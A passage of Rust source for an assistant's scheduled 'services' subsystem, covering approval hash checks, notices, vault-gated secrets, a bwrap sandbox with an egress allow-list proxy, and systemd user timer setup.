//! Clio's services (stage 3, S-69): programs that run by themselves on a schedule, with no model
//! in the loop. Written and run only here, in the person's own `clio` process: never from the
//! jail, never by the tool host. `<data>/services` holds them the way `<data>/skills` holds the
//! skills (`skills.rs`, `Kind::Service`: the same lock, versions, records and `removed/`):
//!
//! - `versions/<name>/<n>/`: `service.json` and its files, as approved, byte for byte.
//! - `records/<name>.json`: on or off (and why: paused), current version, failures in a row.
//! - `state/<name>/` (0700): the only folder of Clio's a run may write, its `$CLIO_STATE_DIR`.
//! - `runs/<name>.json`: its last 50 runs; `notices.json`: what the person is told when a chat
//!   opens (a pause, an `attention` run), and `/services` shows.
//! - `locks/<name>.lock`: held while it runs; a run due meanwhile is skipped.
//!
//! A run: the version's files must still be what was approved (else it pauses), its secrets come
//! from the vault only when the vault lets each go to every one of its hosts (else it waits, and
//! is tried again at most every 15 minutes), and the host launcher runs it under bwrap as the
//! person: the machine read-only, nothing of the home but its version folder, the paths it
//! declared to read (read-only) and to write, its state folder; `/run` hidden; no new privileges;
//! its limits (a transient user scope's cgroup when one starts, else per process); `umask 077`;
//! and the network only through an allow-list proxy of its hosts that connects only to public
//! addresses.

use std::fs;
use std::io::Read;
use std::os::unix::fs::{MetadataExt, OpenOptionsExt};
use std::path::{Path, PathBuf};
use std::time::Duration;

use clio_node::{HostJail, HostJob, ServiceRun};
use clio_toolhost::services::{self as sv, Manifest, Run};
use clio_toolhost::skills::SkillFile;
use clio_vault::{Scrubber, VaultClient, VaultError};
use serde::{Deserialize, Serialize};

use super::home::Dirs;
use super::skills::{self, Kind, Record};
use super::{Res, io_err, mkdir_private, now_ms, write_private};

/// Why a service is off when Clio turned it off.
pub const PAUSED_FAILS: &str = "paused: three failed runs in a row";
pub const PAUSED_CHANGED: &str = "paused: its files changed on disk after it was approved";
/// Notices kept.
const KEPT_NOTICES: usize = 50;
/// A service waiting for the vault or a secret is tried again by the timer at most this often.
pub const WAIT_RETRY_MS: i64 = 15 * 60_000;
/// The timer's two units, in `~/.config/systemd/user`.
pub const UNITS: [&str; 2] = ["clio-services.service", "clio-services.timer"];

pub fn root(d: &Dirs) -> PathBuf {
    d.data.join("services")
}

fn state_dir(root: &Path, name: &str) -> PathBuf {
    root.join("state").join(name)
}

// ---- notices --------------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Notice {
    pub at_ms: i64,
    pub name: String,
    pub text: String,
    /// Shown when a chat opened.
    #[serde(default)]
    pub seen: bool,
}

fn with_notices<T>(root: &Path, f: impl FnOnce(&mut Vec<Notice>) -> T) -> Res<T> {
    mkdir_private(root)?;
    let lock = root.join(".notices.lock");
    let l = fs::OpenOptions::new()
        .create(true)
        .truncate(false)
        .write(true)
        .mode(0o600)
        .open(&lock)
        .map_err(|e| io_err(&lock, &e))?;
    rustix::fs::flock(&l, rustix::fs::FlockOperation::LockExclusive)
        .map_err(|e| format!("{}: {e}", lock.display()))?;
    let p = root.join("notices.json");
    let mut all: Vec<Notice> = fs::read_to_string(&p)
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default();
    let out = f(&mut all);
    let keep = all.len().saturating_sub(KEPT_NOTICES);
    all.drain(..keep);
    let tmp = p.with_extension("json.tmp");
    write_private(
        &tmp,
        &serde_json::to_vec_pretty(&all).map_err(|e| e.to_string())?,
    )?;
    fs::rename(&tmp, &p).map_err(|e| io_err(&p, &e))?;
    Ok(out)
}

pub(crate) fn notice(root: &Path, name: &str, text: &str) {
    let n = Notice {
        at_ms: now_ms(),
        name: name.into(),
        text: text.into(),
        seen: false,
    };
    if let Err(e) = with_notices(root, |all| all.push(n)) {
        eprintln!("clio services: a notice was lost: {e}");
    }
}

fn notice_line(n: &Notice, word: &str) -> String {
    super::tui::sanitize::line(&format!("{word} «{}»: {}", n.name, n.text))
}

/// The notices no chat has shown yet, as quiet notes, now marked seen.
pub fn take_notices(d: &Dirs) -> Vec<String> {
    take_notices_in(&root(d), "service")
}

/// `take_notices` of a folder whose notices are about a `word` (`service`, `MCP server`).
pub(crate) fn take_notices_in(root: &Path, word: &str) -> Vec<String> {
    if !root.join("notices.json").is_file() {
        return vec![];
    }
    with_notices(root, |all| {
        all.iter_mut()
            .filter(|n| !n.seen)
            .map(|n| {
                n.seen = true;
                notice_line(n, word)
            })
            .collect()
    })
    .unwrap_or_default()
}

pub(crate) fn recent_notices(root: &Path, k: usize) -> Vec<Notice> {
    let all: Vec<Notice> = fs::read_to_string(root.join("notices.json"))
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default();
    all.into_iter().rev().take(k).collect()
}

// ---- registering ----------------------------------------------------------------------------

/// Registers service `p` exactly as it was set aside and shown (the person approved it): its
/// manifest and files must still be what was reviewed (`sha256`), its manifest Clio's own, and
/// its write paths allowed under this home. Only `clio approve` / the Approval box get here.
pub fn register_approved(d: &Dirs, p: &clio_toolhost::pending::Pending) -> Res<String> {
    let (name, description, manifest, files) = clio_toolhost::pending::service_of(p)
        .ok_or_else(|| format!("{} is not a service", p.id))?;
    let mut files: Vec<SkillFile> = files
        .into_iter()
        .map(|(path, content)| SkillFile {
            path: path.into(),
            content: content.into(),
        })
        .collect();
    if p.args["sha256"].as_str() != Some(&clio_toolhost::skills::digest(manifest, &files)) {
        return Err(format!(
            "{} is not what was reviewed: nothing was registered",
            p.id
        ));
    }
    let m = sv::check_stored(name, manifest, &files)?;
    if let Some(why) = m
        .writes
        .iter()
        .find_map(|w| sv::write_refused(w, &d.home, &d.control()))
    {
        return Err(format!("writes: {why}: nothing was registered"));
    }
    if let Some(why) = m
        .reads
        .iter()
        .find_map(|r| sv::read_refused(r, &d.home, &d.control()))
    {
        return Err(format!("reads: {why}: nothing was registered"));
    }
    // Stored in path order: what a run reads back from the folder is hashed the same way.
    files.sort_by(|a, b| a.path.cmp(&b.path));
    let verdict = match p.args["verdict"].as_str() {
        Some("passes") => "passes, approved",
        _ => "not checked, approved",
    };
    let root = root(d);
    let n = skills::register_in(
        &root,
        Kind::Service,
        &skills::New {
            name,
            description,
            skill_md: manifest,
            files: &files,
            by: "person",
            verdict,
        },
    )?;
    mkdir_private(&state_dir(&root, name))?;
    let timer = if timer_files_exist(&d.home) {
        String::new()
    } else {
        " (the timer is not set up: clio services enable)".into()
    };
    Ok(format!(
        "the service «{name}» is registered (version {n}): it runs {}{timer}",
        when_words(&m)
    ))
}

fn when_words(m: &Manifest) -> String {
    match &m.schedule.at {
        Some(at) => format!("every day at {at}"),
        None => format!("every {}", m.schedule.every),
    }
}

// ---- running --------------------------------------------------------------------------------

/// Every file under `dir`, read without following a link (a link, or anything not a plain file
/// or folder, is an error): the main file and the rest, in path order.
fn read_tree(dir: &Path, main: &str) -> Res<(String, Vec<SkillFile>)> {
    fn walk(base: &Path, rel: &str, out: &mut Vec<SkillFile>) -> Res<()> {
        let at = if rel.is_empty() {
            base.to_path_buf()
        } else {
            base.join(rel)
        };
        for e in fs::read_dir(&at).map_err(|e| io_err(&at, &e))? {
            let e = e.map_err(|e| io_err(&at, &e))?;
            let name = e.file_name().to_string_lossy().into_owned();
            let r = if rel.is_empty() {
                name
            } else {
                format!("{rel}/{name}")
            };
            let p = base.join(&r);
            let meta = fs::symlink_metadata(&p).map_err(|e| io_err(&p, &e))?;
            if meta.is_dir() {
                walk(base, &r, out)?;
            } else if meta.is_file() {
                let mut t = String::new();
                fs::OpenOptions::new()
                    .read(true)
                    .custom_flags(rustix::fs::OFlags::NOFOLLOW.bits() as i32)
                    .open(&p)
                    .and_then(|mut f| f.read_to_string(&mut t))
                    .map_err(|e| io_err(&p, &e))?;
                out.push(SkillFile {
                    path: r,
                    content: t,
                });
            } else {
                return Err(format!("{}: not a plain file", p.display()));
            }
        }
        Ok(())
    }
    let mut all = vec![];
    walk(dir, "", &mut all)?;
    let i = all
        .iter()
        .position(|f| f.path == main)
        .ok_or_else(|| format!("{main} is missing"))?;
    let m = all.remove(i);
    all.sort_by(|a, b| a.path.cmp(&b.path));
    Ok((m.content, all))
}

/// The registered version of `r`, as approved: `Err` when anything in its folder changed.
fn verified(root: &Path, r: &Record) -> Res<Manifest> {
    let v = r
        .versions
        .iter()
        .find(|v| v.n == r.current)
        .ok_or("its current version is not in its record")?;
    let (main, files) = read_tree(&skills::version_dir(root, &r.name, r.current), sv::MANIFEST)?;
    if clio_toolhost::skills::digest(&main, &files) != v.sha256 {
        return Err("its files are not what was approved".into());
    }
    sv::check_stored(&r.name, &main, &files)
}

fn save_run(root: &Path, name: &str, run: Run) -> Res<()> {
    let dir = root.join("runs");
    mkdir_private(&dir)?;
    let mut all = sv::runs(root, name);
    // Waiting again for the same thing: one entry, its time moved on.
    match all.last_mut() {
        Some(l) if l.outcome == "waiting" && run.outcome == "waiting" && l.why == run.why => {
            *l = run;
        }
        _ => all.push(run),
    }
    let keep = all.len().saturating_sub(sv::KEPT_RUNS);
    all.drain(..keep);
    let p = dir.join(format!("{name}.json"));
    let tmp = p.with_extension("json.tmp");
    write_private(
        &tmp,
        &serde_json::to_vec_pretty(&all).map_err(|e| e.to_string())?,
    )?;
    fs::rename(&tmp, &p).map_err(|e| io_err(&p, &e))
}

/// Changes the record of `name` under the folder's lock (a run and `clio services` may race).
fn update_record(root: &Path, name: &str, f: impl FnOnce(&mut Record)) -> Res<()> {
    let _l = skills::lock_in(root, Kind::Service)?;
    let mut r =
        skills::record(root, name).ok_or_else(|| format!("there is no service «{name}»"))?;
    f(&mut r);
    skills::save(root, &r)
}

fn pause(root: &Path, name: &str, why: &str) {
    let done = update_record(root, name, |r| {
        r.enabled = false;
        r.off = Some(why.into());
    });
    if let Err(e) = done {
        eprintln!("clio services: «{name}» could not be paused: {e}");
    }
    notice(
        root,
        name,
        &format!("{why}; clio services on {name} turns it back on"),
    );
}

/// `'…'` for bash, whatever `s` holds.
pub(crate) fn quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// What a run needs from outside this module: the launcher, the `clio` binary (the forwarder
/// inside the jail is `clio pi-net`), the vault's gateway socket, and the folder for the proxy.
pub struct Runner<'a> {
    pub dirs: &'a Dirs,
    pub jail: &'a HostJail,
    pub exe: PathBuf,
    pub gateway: Option<PathBuf>,
    pub proxy_parent: PathBuf,
}

impl<'a> Runner<'a> {
    pub fn new(dirs: &'a Dirs, jail: &'a HostJail) -> Res<Self> {
        let rt = dirs.need_runtime()?.to_path_buf();
        mkdir_private(&rt)?;
        Ok(Self {
            dirs,
            jail,
            exe: std::env::current_exe().map_err(|e| e.to_string())?,
            gateway: super::vault::gateway_socket(dirs).ok(),
            proxy_parent: rt,
        })
    }

    /// Runs `name` now (`by`: `timer` or `person`): `Ok(None)` when it was skipped because a run
    /// of it is still going. Every other end is a recorded run.
    pub fn run(&self, name: &str, by: &str) -> Res<Option<Run>> {
        self.run_checked(name, by, None)
    }

    /// `run`; with `due_at`, only if it is still due then once its lock is taken (`due_now`):
    /// a run started meanwhile, or a wait less than 15 minutes ago, makes it `Ok(None)`.
    pub fn run_checked(&self, name: &str, by: &str, due_at: Option<i64>) -> Res<Option<Run>> {
        let root = root(self.dirs);
        let r =
            skills::record(&root, name).ok_or_else(|| format!("there is no service «{name}»"))?;
        if !r.enabled {
            return Err(format!(
                "«{name}» is off ({}): clio services on {name}",
                r.off.as_deref().unwrap_or("off")
            ));
        }
        let locks = root.join("locks");
        mkdir_private(&locks)?;
        let lp = locks.join(format!("{name}.lock"));
        let lock = fs::OpenOptions::new()
            .create(true)
            .truncate(false)
            .write(true)
            .mode(0o600)
            .open(&lp)
            .map_err(|e| io_err(&lp, &e))?;
        if rustix::fs::flock(&lock, rustix::fs::FlockOperation::NonBlockingLockExclusive).is_err() {
            return Ok(None);
        }
        if let Some(now) = due_at
            && !due_now(&root, name, now)?
        {
            return Ok(None);
        }
        let prev = sv::runs(&root, name).last().cloned();
        let start = now_ms();
        let began = std::time::Instant::now();
        let mut run = Run {
            start_ms: start,
            ms: 0,
            version: r.current,
            outcome: "failed".into(),
            exit: None,
            why: String::new(),
            tail: String::new(),
            by: by.into(),
            limits: String::new(),
        };
        let m = match verified(&root, &r) {
            Ok(m) => m,
            Err(e) => {
                run.outcome = "paused".into();
                run.why = "its files changed after approval".into();
                save_run(&root, name, run.clone())?;
                pause(&root, name, PAUSED_CHANGED);
                self.log(name, &run, false);
                eprintln!("clio services: «{name}»: {e}");
                return Ok(Some(run));
            }
        };
        let outcome = self.launch(&root, &r, &m, &mut run);
        run.ms = u64::try_from(began.elapsed().as_millis()).unwrap_or(u64::MAX);
        if let Err(why) = outcome {
            run.outcome = "failed".into();
            run.why = why;
        }
        save_run(&root, name, run.clone())?;
        self.after(&root, name, &run, prev.as_ref());
        self.log(name, &run, !m.network.is_empty());
        Ok(Some(run))
    }

    /// The failures in a row, the pause after the third, the notice of an `attention`, and of a
    /// wait once (not again while it waits for the same thing).
    fn after(&self, root: &Path, name: &str, run: &Run, prev: Option<&Run>) {
        let mut paused = false;
        let counted = update_record(root, name, |r| match run.outcome.as_str() {
            "ok" | "attention" => r.failures = 0,
            "failed" => {
                r.failures += 1;
                if r.failures >= sv::FAILS_TO_PAUSE && r.enabled {
                    r.enabled = false;
                    r.off = Some(PAUSED_FAILS.into());
                    paused = true;
                }
            }
            _ => {}
        });
        if let Err(e) = counted {
            eprintln!("clio services: «{name}»: {e}");
        }
        if paused {
            notice(
                root,
                name,
                &format!("{PAUSED_FAILS}; clio services logs {name} shows why"),
            );
        }
        if run.outcome == "waiting"
            && !prev.is_some_and(|p| p.outcome == "waiting" && p.why == run.why)
        {
            notice(
                root,
                name,
                &format!(
                    "{}; it is tried again every {} minutes",
                    run.why,
                    WAIT_RETRY_MS / 60_000
                ),
            );
        }
        if run.outcome == "attention" {
            // Its last lines: a service prints why last.
            let mut first: Vec<&str> = run
                .tail
                .lines()
                .rev()
                .filter(|l| !l.trim().is_empty())
                .take(3)
                .collect();
            first.reverse();
            notice(
                root,
                name,
                &format!(
                    "needs your attention: {}",
                    if first.is_empty() {
                        "(it printed nothing)".into()
                    } else {
                        first.join(" / ")
                    }
                ),
            );
        }
    }

    /// One line of the action log per run: the name and the outcome, never what it printed.
    fn log(&self, name: &str, run: &Run, network: bool) {
        if let Err(e) = clio_toolhost::host::log_line(
            &super::pending::state(self.dirs),
            "services",
            &format!("service:{name}"),
            "service_run",
            name,
            network,
            &run.outcome,
            "services/run",
            run.exit.map(i64::from),
        ) {
            eprintln!("clio services: the action log lost a line: {e}");
        }
    }

    /// Secrets, the proxy, the launcher: fills `run`; `Err` is a failure and why.
    fn launch(&self, root: &Path, r: &Record, m: &Manifest, run: &mut Run) -> Res<()> {
        let state = state_dir(root, &r.name);
        mkdir_private(&state)?;
        let vdir = skills::version_dir(root, &r.name, r.current);
        let spec = Spec {
            tool: "service",
            name: &r.name,
            command: &m.command,
            stdin: false,
            cwd: vdir.clone(),
            home: self.dirs.home.clone(),
            network: &m.network,
            secrets: &m.secrets,
            reads: &m.reads,
            writes: &m.writes,
            own: vec![state.clone()],
            shows: vec![vdir],
            env: vec![("CLIO_SERVICE".to_owned(), r.name.clone())],
            cpu_percent: m.limits.cpu_percent,
            memory_mb: m.limits.memory_mb,
            seconds: m.limits.seconds,
        };
        let (job, input, scrub, proxy) = match self.prepare(&spec)? {
            Prepared::Wait(why) => {
                run.outcome = "waiting".into();
                run.why = why;
                return Ok(());
            }
            Prepared::Ready {
                job,
                input,
                scrub,
                proxy,
            } => (job, input, scrub, proxy),
        };
        let out = self.jail.run_service(&job, input, &|| false);
        drop(proxy);
        let (out, scoped) = out?;
        run.limits = if scoped { "cgroup" } else { "per-process" }.into();
        let both = format!("{}{}", out.stdout, out.stderr);
        // Its own secrets by value, then the vault's (every secret it holds); a vault that cannot
        // filter means the output is not kept.
        let mut text = scrub.scrub(&both);
        if let Some(g) = &self.gateway
            && g.exists()
        {
            match VaultClient::new(g).scrub(&text) {
                Ok(t) => text = t,
                Err(VaultError::Io(_)) if m.secrets.is_empty() => {}
                Err(_) => text = "(output withheld: the vault could not filter it)".into(),
            }
        }
        let text = super::tui::sanitize::multiline(&text);
        let cut = text.len().saturating_sub(sv::TAIL_BYTES);
        let cut = (cut..=text.len())
            .find(|i| text.is_char_boundary(*i))
            .unwrap_or(text.len());
        run.tail = text[cut..].trim().to_owned();
        run.exit = out.exit_code;
        (run.outcome, run.why) = if out.timed_out {
            (
                "failed".into(),
                format!("over its time limit of {} s", m.limits.seconds),
            )
        } else {
            match out.exit_code {
                Some(0) => ("ok".into(), String::new()),
                Some(sv::ATTENTION) => ("attention".into(), String::new()),
                Some(_) => ("failed".into(), String::new()),
                None => (
                    "failed".into(),
                    format!("ended by signal {}", out.signal.unwrap_or(0)),
                ),
            }
        };
        Ok(())
    }
}

/// What a program in a service's jail declared (a service's run, an MCP server, npm for one):
/// the same checks, secrets, proxy and launcher for all (S-69, S-70).
pub struct Spec<'s> {
    /// The vault's tool its secrets are bound to: `service` or `mcp` (`<tool>:<host>`).
    pub tool: &'s str,
    pub name: &'s str,
    /// Run by `bash -c` after the secrets are read into their variables.
    pub command: &'s str,
    /// Its standard input stays open after the secrets (an MCP server talks over it); else
    /// `/dev/null`.
    pub stdin: bool,
    pub cwd: PathBuf,
    /// Its `HOME` (a service: the person's, hidden; an MCP server: its own folder).
    pub home: PathBuf,
    pub network: &'s [String],
    pub secrets: &'s [sv::SecretUse],
    pub reads: &'s [String],
    pub writes: &'s [String],
    /// Clio's folders it may write (the first is `$CLIO_STATE_DIR`): private, existing.
    pub own: Vec<PathBuf>,
    /// Clio's folders (or the home's) it may read.
    pub shows: Vec<PathBuf>,
    pub env: Vec<(String, String)>,
    pub cpu_percent: u32,
    pub memory_mb: u64,
    /// A service's time limit; a long-lived program's processor-time budget.
    pub seconds: u64,
}

/// A program ready to start, or why it waits (the vault, a secret not allowed to a host).
// One lives for a moment before a start: boxing the large variant would buy nothing.
#[allow(clippy::large_enum_variant)]
pub enum Prepared {
    Wait(String),
    Ready {
        job: ServiceRun,
        /// Its secrets, NUL-terminated, for its standard input.
        input: Vec<u8>,
        /// Its secrets' values.
        scrub: Scrubber,
        /// Its hosts' proxy: alive as long as the program.
        proxy: Option<clio_brain::pi::net::EgressProxy>,
    },
}

impl Runner<'_> {
    /// The paths checked again (what is there now, not what was there at approval), the secrets
    /// from the vault only when it lets each go to every declared host (the program can send it
    /// to any of them), only as their variable; the proxy of its hosts; the masks.
    pub fn prepare(&self, s: &Spec<'_>) -> Res<Prepared> {
        if self.jail.launcher() != clio_node::Launcher::Bwrap {
            return Err(NOT_SYSTEMD.into());
        }
        let d = self.dirs;
        let control = d.control();
        let mut writable = s.own.clone();
        for w in s.writes {
            if let Some(why) = sv::write_refused(w, &d.home, &control) {
                return Err(format!("writes: {why}"));
            }
            writable.push(PathBuf::from(w));
        }
        let mut shows = s.shows.clone();
        for p in s.reads {
            if let Some(why) = sv::read_refused(p, &d.home, &control) {
                return Err(format!("reads: {why}"));
            }
            shows.push(PathBuf::from(p));
        }
        // The forwarder (`clio pi-net`) runs inside: the binary is shown when the home hides it.
        if self.exe.starts_with(&d.home) {
            shows.push(self.exe.clone());
        }
        let scrub = Scrubber::default();
        let mut input = Vec::new();
        let mut prefix = String::new();
        if !s.secrets.is_empty() {
            let Some(g) = &self.gateway else {
                return Ok(Prepared::Wait(
                    "waiting for the vault (it is not running)".into(),
                ));
            };
            let vault = VaultClient::new(g);
            let trace = format!("{}:{}", s.tool, s.name);
            let wait = |e: &VaultError, name: &str, host: &str| match e {
                VaultError::Locked => "waiting for the vault (it is locked)".to_owned(),
                VaultError::Io(_) => "waiting for the vault (it is not running)".into(),
                _ => format!(
                    "waiting for the secret {name} to be allowed to reach {host} (clio vault put {name} --dest {}:{host})",
                    s.tool
                ),
            };
            for sec in s.secrets {
                if !s.network.iter().any(|h| sv::host_of(h) == sec.host) {
                    return Err(format!("the secret {} is for an undeclared host", sec.name));
                }
                for h in s.network {
                    if let Err(e) = vault.check(&sec.name, s.tool, Some(sv::host_of(h)), &trace) {
                        return Ok(Prepared::Wait(wait(&e, &sec.name, sv::host_of(h))));
                    }
                }
            }
            for sec in s.secrets {
                match vault.resolve(&sec.name, s.tool, &sec.host, &trace) {
                    Ok(v) => {
                        scrub.add(&sec.name, v.expose());
                        input.extend_from_slice(v.expose().as_bytes());
                        input.push(0);
                        prefix.push_str(&format!(
                            "IFS= read -r -d '' {e} || exit 75; export {e}; ",
                            e = sec.env
                        ));
                    }
                    Err(e) => {
                        input.fill(0);
                        return Ok(Prepared::Wait(wait(&e, &sec.name, &sec.host)));
                    }
                }
            }
        }
        // What it writes is its own: private, as everything of Clio's (S-23).
        let mut prefix = format!("umask 077; {prefix}");
        if !s.stdin {
            prefix.push_str("exec </dev/null; ");
        }
        let mut env = vec![(
            "CLIO_STATE_DIR".to_owned(),
            writable
                .first()
                .map(|w| w.display().to_string())
                .unwrap_or_default(),
        )];
        env.extend(s.env.iter().cloned());
        let mut command = format!("{prefix}{}", s.command);
        let proxy = if s.network.is_empty() {
            None
        } else {
            let allow: Vec<String> = s.network.iter().filter_map(|h| sv::host_port(h)).collect();
            let p = clio_brain::pi::net::EgressProxy::start_service(&self.proxy_parent, &allow)?;
            shows.push(p.dir().to_path_buf());
            for k in ["HTTPS_PROXY", "HTTP_PROXY", "https_proxy", "http_proxy"] {
                env.push((k.into(), clio_brain::pi::net::PROXY_URL.into()));
            }
            command = format!(
                "{prefix}exec {} pi-net --listen {} --upstream {} -- bash -c {}",
                quote(&self.exe.display().to_string()),
                clio_brain::pi::net::FORWARD_ADDR,
                quote(&p.socket().display().to_string()),
                quote(s.command)
            );
            Some(p)
        };
        let mut masks = control;
        // The whole home: its sockets (what starts programs: a process manager, a terminal
        // multiplexer) and its credentials; and `/run`: the person's D-Bus (`systemd-run --user`
        // would start something outside the jail), Docker's socket and the vault's sockets. The
        // version folder, the declared paths and the proxy folder are windows.
        masks.extend([d.home.clone(), PathBuf::from("/run")]);
        let job = ServiceRun {
            job: HostJob {
                command,
                cwd: s.cwd.clone(),
                home: s.home.clone(),
                network: false,
                timeout: Some(Duration::from_secs(s.seconds)),
                max_output: sv::TAIL_BYTES * 4,
                masks,
                shows,
                read_only: false,
            },
            writable,
            cpu_percent: s.cpu_percent,
            memory_mb: s.memory_mb,
            env,
        };
        Ok(Prepared::Ready {
            job,
            input,
            scrub,
            proxy,
        })
    }
}

/// Whether `name` runs now from the timer: on, due by its schedule, and not waiting for the
/// vault or a secret since less than `WAIT_RETRY_MS`. `Err`: its manifest does not read.
fn due_now(root: &Path, name: &str, now: i64) -> Res<bool> {
    let Some(rec) = sv::record(root, name) else {
        return Ok(false);
    };
    if rec["enabled"] != serde_json::Value::Bool(true) {
        return Ok(false);
    }
    let m = sv::current_manifest(root, &rec).ok_or("its manifest does not read")?;
    let runs = sv::runs(root, name);
    if runs
        .last()
        .is_some_and(|l| l.outcome == "waiting" && now - l.start_ms < WAIT_RETRY_MS)
    {
        return Ok(false);
    }
    Ok(sv::due(
        &m.schedule,
        sv::last_start(&runs),
        sv::since_of(&rec),
        now,
        sv::local_offset(now),
    ))
}

/// Starts `<exe> services run-timer <name>` in a transient user scope of its own and does not
/// wait for it: `Ok` once it is in its scope (out of the timer's unit, which may then end without
/// stopping it) or already ended well. `Err`: no scope (it ran nothing).
fn start_detached(systemd_run: &Path, exe: &Path, name: &str) -> Res<()> {
    let mut child = std::process::Command::new(systemd_run)
        .args(["--user", "--scope", "--quiet", "--collect", "--"])
        .arg(exe)
        .args(["services", "run-timer", name])
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .map_err(|e| format!("{}: {e}", systemd_run.display()))?;
    let mine = fs::read_to_string("/proc/self/cgroup").unwrap_or_default();
    let until = std::time::Instant::now() + Duration::from_secs(10);
    loop {
        if let Some(st) = child.try_wait().map_err(|e| e.to_string())? {
            return if st.success() {
                Ok(())
            } else {
                Err(format!("its scope did not start ({st})"))
            };
        }
        let theirs = fs::read_to_string(format!("/proc/{}/cgroup", child.id())).unwrap_or_default();
        if !theirs.is_empty() && theirs != mine {
            return Ok(());
        }
        if std::time::Instant::now() > until {
            let _ = child.kill();
            let _ = child.wait();
            return Err("its scope did not start in 10 s".into());
        }
        std::thread::sleep(Duration::from_millis(20));
    }
}

/// Everything due now (`clio services run-due`, from the timer). With scopes (the launcher's
/// `systemd-run`), each in its own, not waited for: a slow one holds up no other, and its lock
/// keeps two runs of it apart. Else, or when its scope does not start, one after the other.
pub fn run_due(runner: &Runner<'_>, now: i64) -> Vec<String> {
    let root = root(runner.dirs);
    let mut out = vec![];
    for r in skills::records(&root) {
        match due_now(&root, &r.name, now) {
            Ok(true) => {}
            Ok(false) => continue,
            Err(e) => {
                out.push(format!("{}: {e}", r.name));
                continue;
            }
        }
        if let Some(sr) = runner.jail.scope() {
            match start_detached(sr, &runner.exe, &r.name) {
                Ok(()) => {
                    out.push(format!("{}: started in a scope of its own", r.name));
                    continue;
                }
                Err(e) => eprintln!("clio services: «{}»: {e}; it runs here", r.name),
            }
        }
        out.push(match runner.run_checked(&r.name, "timer", Some(now)) {
            Ok(Some(x)) => format!("{}: {}", r.name, x.outcome),
            Ok(None) => format!("{}: skipped, a run of it is still going", r.name),
            Err(e) => format!("{}: {e}", r.name),
        });
    }
    out
}

// ---- the timer ------------------------------------------------------------------------------

fn unit_dir(home: &Path) -> PathBuf {
    home.join(".config/systemd/user")
}

fn timer_files_exist(home: &Path) -> bool {
    UNITS.iter().all(|u| unit_dir(home).join(u).is_file())
}

/// The two units: a oneshot that runs `clio services run-due`, every minute, catching up once
/// after the machine was off (`Persistent`).
fn units(exe: &Path) -> Res<[(&'static str, String); 2]> {
    let e = exe.display().to_string();
    if !exe.is_absolute()
        || e.chars()
            .any(|c| c.is_whitespace() || c.is_control() || "%\\\"'$;".contains(c))
    {
        return Err(format!(
            "{e}: the timer needs a plain absolute path to clio"
        ));
    }
    Ok([
        (
            UNITS[0],
            format!(
                "# Written by `clio services enable`; `clio services disable` removes it.\n[Unit]\nDescription=Clio's services: run what is due\n\n[Service]\nType=oneshot\nExecStart={e} services run-due\nNoNewPrivileges=yes\nUMask=0077\n"
            ),
        ),
        (
            UNITS[1],
            "# Written by `clio services enable`; `clio services disable` removes it.\n[Unit]\nDescription=Clio's services, every minute\n\n[Timer]\nOnCalendar=minutely\nPersistent=true\nAccuracySec=10s\n\n[Install]\nWantedBy=timers.target\n".to_owned(),
        ),
    ])
}

fn user_name() -> Option<String> {
    let uid = fs::metadata("/proc/self").ok()?.uid().to_string();
    fs::read_to_string("/etc/passwd")
        .ok()?
        .lines()
        .map(|l| l.split(':').collect::<Vec<_>>())
        .find(|f| f.get(2) == Some(&uid.as_str()))
        .map(|f| f[0].to_owned())
}

fn systemctl() -> Option<PathBuf> {
    ["/usr/bin/systemctl", "/bin/systemctl"]
        .iter()
        .map(PathBuf::from)
        .find(|p| p.is_file())
}

fn call(systemctl: Option<&Path>, args: &[&str]) -> Res<()> {
    let Some(s) = systemctl else { return Ok(()) };
    let st = std::process::Command::new(s)
        .arg("--user")
        .args(args)
        .status()
        .map_err(|e| format!("systemctl: {e}"))?;
    if st.success() {
        Ok(())
    } else {
        Err(format!("systemctl --user {} failed ({st})", args.join(" ")))
    }
}

/// `clio services enable`: writes the two unit files (0600) and starts the timer with the
/// person's own `systemctl --user` (`systemctl`: `None` writes the files only). No root.
pub fn enable_in(home: &Path, exe: &Path, systemctl: Option<&Path>) -> Res<Vec<String>> {
    let dir = unit_dir(home);
    fs::create_dir_all(&dir).map_err(|e| io_err(&dir, &e))?;
    let mut out = vec!["clio services enable writes these files, and nothing else:".to_owned()];
    for (name, text) in units(exe)? {
        let p = dir.join(name);
        write_private(&p, text.as_bytes())?;
        out.push(format!("  {}", p.display()));
    }
    call(systemctl, &["daemon-reload"])?;
    call(systemctl, &["enable", "--now", UNITS[1]])?;
    out.push(format!(
        "the timer runs `{} services run-due` every minute",
        exe.display()
    ));
    if let Some(u) = user_name()
        && !Path::new("/var/lib/systemd/linger").join(&u).exists()
    {
        out.push(format!(
            "lingering is off for {u}: the timer stops when you log out. To keep it running, run this yourself (Clio does not): loginctl enable-linger {u}"
        ));
    }
    Ok(out)
}

/// `clio services disable`: stops the timer and removes exactly the two unit files.
pub fn disable_in(home: &Path, systemctl: Option<&Path>) -> Res<Vec<String>> {
    // Stopping may fail when it was never started: the files go anyway.
    let stopped = call(systemctl, &["disable", "--now", UNITS[1]]);
    let mut out = vec![];
    for name in UNITS {
        let p = unit_dir(home).join(name);
        match fs::remove_file(&p) {
            Ok(()) => out.push(format!("removed {}", p.display())),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => return Err(io_err(&p, &e)),
        }
    }
    call(systemctl, &["daemon-reload"])?;
    if let Err(e) = stopped {
        out.push(format!("({e})"));
    }
    out.push("the timer is off: services run only with clio services run <name>".into());
    Ok(out)
}

/// Draft time (S-69): a secret of `m` the vault, as it is now, does not let go to one of `m`'s
/// hosts (the run could send it to any of them), and why; `None` when it lets each go to all, or
/// cannot say yet (not running, locked, the secret not stored: each run then waits until it can).
pub fn secret_hosts_refused(d: &Dirs, m: &Manifest) -> Option<String> {
    let g = super::vault::gateway_socket(d).ok()?;
    secret_hosts_refused_by(&VaultClient::new(&g), m)
}

fn secret_hosts_refused_by(vault: &VaultClient, m: &Manifest) -> Option<String> {
    for s in &m.secrets {
        for h in &m.network {
            let host = sv::host_of(h);
            if let Err(VaultError::Denied(_)) = vault.check(
                &s.name,
                "service",
                Some(host),
                &format!("service:{}", m.name),
            ) {
                return Some(format!(
